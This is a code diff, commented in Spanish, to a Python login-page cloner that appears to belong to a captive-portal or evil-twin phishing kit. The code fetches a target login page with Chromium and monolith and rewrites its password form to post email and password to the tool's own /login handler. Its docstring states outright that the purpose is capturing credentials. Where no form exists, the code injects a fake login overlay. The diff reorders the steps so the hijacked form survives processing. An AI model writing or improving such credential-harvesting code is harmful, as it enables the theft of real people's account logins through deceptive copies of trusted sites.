@@ -165,17 +165,16 @@ _PORTAL_HTML_SUCCESS = """<!DOCTYPE html>
 
 # ── Clonador de páginas de login ─────────────────────────────────
 
-def _adapt_form(html_text, _log):
+def _patch_form(html_text, _log):
     """
-    Adapta el HTML clonado para capturar credenciales:
-      - Busca el formulario con campo password y lo apunta a POST /login
-      - Si no hay formulario, inyecta overlay con form propio
-      - Elimina scripts externos y tags <base>
+    Paso 1 (pre-monolith): adapta el formulario de login en el DOM de chromium.
+    NO elimina scripts ni <base> para que monolith pueda resolver recursos CSS/fuentes.
+    Devuelve (html_adaptado, form_encontrado).
     """
     try:
         from bs4 import BeautifulSoup
     except ImportError:
-        return html_text
+        return html_text, False
 
     soup = BeautifulSoup(html_text, "html.parser")
 
@@ -197,7 +196,54 @@ def _adapt_form(html_text, _log):
         if pwd:
             pwd["name"] = "password"
         _log("[+] Formulario adaptado → POST /login")
+        return str(soup), True
     else:
+        return html_text, False
+
+
+def _adapt_form(html_text, _log):
+    """
+    Paso 2 (post-monolith o fallback): limpia scripts externos/<base> e inyecta
+    overlay si no hay form adaptado. Si _patch_form ya adaptó el form (action=/login),
+    lo detecta y no sobreescribe ni inyecta overlay.
+    """
+    try:
+        from bs4 import BeautifulSoup
+    except ImportError:
+        return html_text
+
+    soup = BeautifulSoup(html_text, "html.parser")
+
+    # Comprobar si el form ya fue adaptado por _patch_form (action="/login")
+    already_adapted = any(
+        f.get("action") in ("/login", "/login/") 
+        for f in soup.find_all("form")
+    )
+
+    if already_adapted:
+        # Form ya adaptado correctamente — solo limpiar
+        pass
+    else:
+        # Buscar form con password y adaptarlo
+        target_form = next(
+            (f for f in soup.find_all("form") if f.find("input", {"type": "password"})),
+            None
+        )
+        if target_form:
+            target_form["method"] = "POST"
+            target_form["action"] = "/login"
+            email_input = (
+                target_form.find("input", {"type": "email"}) or
+                target_form.find("input", {"type": "text"}) or
+                target_form.find("input", {"type": "tel"})
+            )
+            if email_input:
+                email_input["name"] = "email"
+            pwd = target_form.find("input", {"type": "password"})
+            if pwd:
+                pwd["name"] = "password"
+            _log("[+] Formulario adaptado → POST /login")
+        else:
         _log("[!] Sin form con password: inyectando overlay")
         overlay = (
             '<div id="wt-overlay" style="position:fixed;top:0;left:0;width:100%;height:100%;'
@@ -326,6 +372,11 @@ def clone_login_page(url, log_fn=None):
             if dump_result.returncode == 0 and len(dump_result.stdout) > 500:
                 _log("[*] Chromium dump-dom OK (" + str(len(dump_result.stdout)) + " bytes)")
 
+                # Adaptar form ANTES de monolith: monolith elimina <input>/<form>
+                # al procesar el HTML, así que parchamos primero y luego monolith
+                # solo se encarga de incrustar CSS/fuentes.
+                patched_html, form_found = _patch_form(dump_result.stdout, _log)
+
                 # monolith lee el HTML de stdin y resuelve recursos relativos
                 # usando la URL como base. --insecure ignora errores TLS.
                 mono_result = subprocess.run(
@@ -336,7 +387,7 @@ def clone_login_page(url, log_fn=None):
                         "-b", url,
                         "--insecure",
                     ],
-                    input=dump_result.stdout,
+                    input=patched_html,
                     capture_output=True,
                     text=True,
                     timeout=120,
@@ -344,7 +395,12 @@ def clone_login_page(url, log_fn=None):
 
                 if mono_result.returncode == 0 and len(mono_result.stdout) > 1000:
                     _log("[+] monolith OK (" + str(len(mono_result.stdout)) + " bytes) — CSS/fuentes embebidas")
-                    return _adapt_form(mono_result.stdout, _log)
+                    if form_found:
+                        # Form ya adaptado, solo limpiar scripts externos y <base>
+                        return _adapt_form(mono_result.stdout, _log)
+                    else:
+                        # No habia form: _adapt_form inyectara el overlay
+                        return _adapt_form(mono_result.stdout, _log)
                 else:
                     stderr_preview = mono_result.stderr[:200] if mono_result.stderr else "sin output"
                     _log("[!] monolith fallo (rc=" + str(mono_result.returncode) + "): " + stderr_preview)
